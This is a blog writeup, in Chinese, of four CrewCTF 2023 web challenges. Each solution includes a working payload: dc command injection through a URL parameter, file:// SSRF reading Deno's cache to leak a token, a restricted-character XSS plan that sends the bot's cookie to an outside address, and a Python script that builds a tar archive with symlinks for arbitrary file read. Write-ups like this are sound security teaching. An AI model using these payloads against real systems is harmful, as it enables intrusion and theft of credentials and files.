---
title: CrewCTF 2023 Web Writeup
date: 2023-07-14 19:20:00
updated: 2023-07-14 20:45:00
tags: [ctf, security]
category: CTF
---

> 环境还在，赛后看看题，一共四道Web，都挺有意思的。

## sequence_gallery
> Do you like sequences?
> [http://sequence-gallery.chal.crewc.tf:8080/](http://sequence-gallery.chal.crewc.tf:8080/) 

```python
sequence = request.args.get('sequence', None)
if sequence is None:
    return render_template('index.html')

script_file = os.path.basename(sequence + '.dc')
if ' ' in script_file or 'flag' in script_file:
    return ':('

proc = subprocess.run(
    ['dc', script_file], 
    capture_output=True,
    text=True,
    timeout=1,
)
output = proc.stdout
```
命令注入的一个trick，查手册可知通过`-e !`，后面的内容会当作命令执行。
![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230714161431.png)

```bash
dc -e \!id
```
![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230714162026.png)
那么在题目中也一样。
```
http://sequence-gallery.chal.crewc.tf:8080/?sequence=--expression=!cat$IFS*.txt;
```
`crew{10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx}`

这里踩到了一个坑，`dc`是一个比较老的命令，在服务器上通常是老的版本，有这个用`!`命令执行的trick，而我的macos默认的dc命令来自`https://git.gavinhoward.com/gavin/bc`。
![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230714162224.png)
这是一个叫做`bc`的仓库，大概是后人维护的工具，涵盖`dc`这个命令的正常使用。
仓库作者指出由于安全问题，忽略了`!`。
```
This bc also includes an implementation of dc in the same binary, accessible via a symbolic link, which implements all FreeBSD and GNU extensions. (If a standalone dc binary is desired, bc can be copied and renamed to dc.) The ! command is omitted; I believe this poses security concerns and that such functionality is unnecessary.
```
对比服务器的dc版本
![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230714162256.png)

## safe_proxy
> Deno sandbox prevents SSRF, right?
> [http://safe-proxy-web.chal.crewc.tf:8083/](http://safe-proxy-web.chal.crewc.tf:8083/)

用`deno`写的服务。
一个在内网，提供flag，需要`PROVIDER_TOKEN`来访问。
另一个可以公网访问，它会用`PROVIDER_TOKEN`访问到`flag`，并且存储在变量中。访问`/`路由会得到`sha-256`后的`flag`值。

另外给出了一个可以`ssrf`的路由，并且限制了可以访问的`host`。
```node.js
const PROVIDER_TOKEN = Deno.env.get('PROVIDER_TOKEN');
const PROVIDER_HOST = Deno.env.get('PROVIDER_HOST');
const { FLAG } = await import(`http://${PROVIDER_HOST}/?token=${PROVIDER_TOKEN}`);
// no ssrf!
await Deno.permissions.revoke({ name: 'net', host: PROVIDER_HOST});
```

这里需要思考的是`flag`还会在哪可以拿到，所以需要本地搭环境搜文件，会发现`.cache`中也有一份。

> https://denolib.gitbook.io/guide/advanced/deno_dir-code-fetch-and-cache#code-fetch-logic

参考文章，通过`import`加载的文件，会存在`.cache/deno/deps/http/<hash>` 下，但是目录的`hash`并不能直接猜到，看`deno`源码后发现计算`hash`需要访问的`url`，而`url`中是有`PROVIDER_TOKEN`的，所以需要通过 `SSRF`读敏感文件来获取到。

又是一顿本地搜索，发现`dep_analysis_cache_v1`中是有一些`url`信息的，这是一个sqlite db文件。
访问`http://safe-proxy-web.chal.crewc.tf:8083/proxy?url=file:///home/app/.cache/deno/dep_analysis_cache_v1`。

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230714172925.png)

得到`http://safe-proxy-flag-provider:8082/?token=5a35327045b0ec9159cc188f643e347f`。

`PROVIDER_TOKEN = 5a35327045b0ec9159cc188f643e347f`

根据`deno`源码，用路由部分计算对应的目录哈希。

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230714173318.png)

访问`http://safe-proxy-web.chal.crewc.tf:8083/proxy?url=file:///home/app/.cache/deno/deps/http/safe-proxy-flag-provider_PORT8082/70ec621b0141f80c80d9e26b084da38df4bbf6b4b64d04c837f7b3cd5fe8482b`

`crew{file://_SSRF_in_modern_6f4544ec261423ce}`

## hex2dec

> Converting from hexadecimal to decimal is a pain.
> 
> web: [http://hex2dec-web.chal.crewc.tf:8084/](http://hex2dec-web.chal.crewc.tf:8084/)  
> bot: [http://hex2dec-bot.chal.crewc.tf:8085/](http://hex2dec-bot.chal.crewc.tf:8085/)

XSS挑战，目标是获取`bot`的`cookie`，限制`inner.html`的内容正则，并且有`CSP`。
CSP：
```
default-src 'none'; script-src 'unsafe-inline';
```
可控的页面内容：
```
		const params = new URLSearchParams(document.location.search.substring(1));
		const v = params.get("v");
		if (/^[0-f +-]+$/g.test(v)) {
			result.innerHTML = `${v} = ${parseInt(v, 16)}`;
		}
```
题目本身是一个16进制转换的正则，但是错误的将`0-9a-f`写成了`0-f`，这会导致包含多余的字符。
```js
let s = '' ;
 for ( let i = 0; i < 0x100; i++) { 
    if (/^[0-f+-]+$/g.test( String .fromCharCode(i))) { 
        s += String .fromCharCode(i);
     } 
} 
console.log(s);
```
```
+-0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdef
```
然而chatgpt的回答😤
![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230717105135.png)
这里的`0-f`是按照`ascii`码大小来排列的，数字和小写字符之间还夹着大写字符和一些符号。

我们的目标是用这些符号，通过`js`获取`cookie`并且将`cookie`带出，如果用`xhr`发请求，要麻烦一些。这里可以用`location.href` 带出`cookie` ，所以现在的目标是实现`location.href = 'http://xx.xx.xx.xx?' + document.cookie`。

> 这里主要学习这篇文章，没有亲手复现学习了一下思路。
> https://nanimokangaeteinai.hateblo.jp/entry/2023/07/10/063030

思路是构造`<IMG SRC=X ONERROR=…><IFRAME ID=X>`，用`IMG`的`ONERROR`执行任意`js`，再结合`Dom cloberring`，利用`iframe`的`contentWindow`获取`location`。

最终可以用`X.parent.location`和`X.contentWindow.document.coookie`来偷`cookie`。而具体利用这些限制的字符去构造的方法应该比较多，相比于`jsfuck`的6个字符要多很多，具体的脚本可以看上面的文章。

`crew{dom_clobbering_is_helpful_for_a_restricted_xss}`

## archive_stat_viewer

> Warning: Never extract archives from untrusted sources without prior inspection. It is possible that files are created outside of path, e.g. members that have absolute filenames starting with "/" or filenames with two dots "..". [https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extractall](https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extractall)
>
>I'm aware this warning but didn't know what to do right. Is this okay?
>[http://archive-stat-viewer.chal.crewc.tf:8081/](http://archive-stat-viewer.chal.crewc.tf:8081/)

考察压缩包软链接上传（zip symlink upload）漏洞。

站点可以上传`tar`文件，并且分析文件大小和更新时间，有`clean`,`analyze`,`/results/<archive_id>`三个主要的后端路由。

- /analyze 解压缩tar
- /results/\<uuid\> 返回result.json的内容
- /clean 删除上传的文件目录

过滤了`..`和`/`，需要用上传软链接的方式来完成任意文件读。

这里首先我们能访问的就是`/results/<uuid>`，所以目标肯定是让`result.json`变成一个指向`flag`的软链接。

如果只上传一次，那么是猜不到本次上传的`tar`，解压后的路径，所以需要先随便传一个，之后上传的`tar`中的软链接覆盖之前上传文件中的`result.json`。

但是之后上传的文件和之前上传的文件并不在同一个目录，比如第一次上传的在`/results/<1stuuid>`，第二次为`/results/<2nduuid>`，我第二次上传的软链接，没法直接传到`/results/<1stuuid>/result.json`，也不能直接覆盖`/results/<2nduuid>/result.json`。比如这里传一个从`/aaa/result.json`指向`flag.txt`的，能指过去，但是我们没办法在`web`上访问到这个文件。

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230717144758.png)

所以这里是需要间接覆盖的，需要上传两个软链接，一个是从`/aaa`指向这个`/results/<1stuuid>`目录的，一个是从`/aaa/result.json`指向`flag.txt`。

先随便传一个`tar`，可以得到对应的`results`目录为`/results/597a328d-ad98-4026-9552-ff4e7f673f85`

接下来上传的`tar`中的两个软链接，一个是从`/aaa`指向这个`results/<uuid>`目录的，一个是从`/aaa/result.json`指向`flag.txt`。
```
import os
import tarfile
import tempfile

with tempfile.TemporaryDirectory() as dir:
    os.symlink('/web-apps/src/archives/597a328d-ad98-4026-9552-ff4e7f673f85', f'{dir}/aaa')
    os.symlink('/web-apps/src/flag.txt', f'{dir}/bbb')
    with tarfile.open('exp.tar', 'w') as f:
        f.add(f'{dir}/aaa', 'aaa')
        f.add(f'{dir}/bbb', 'aaa/result.json')
```

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230717145141.png)

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230717145152.png)

本地成功复现

其实就是先把目录软链接过去，这样对应的`result.json`也就相应的被替换成对应的软连接

![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230717145427.png)

远程也一样打通
![image.png](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/20230717145707.png)

`crew{fixing_zip/tar_slip_vulnerability_is_hard}`

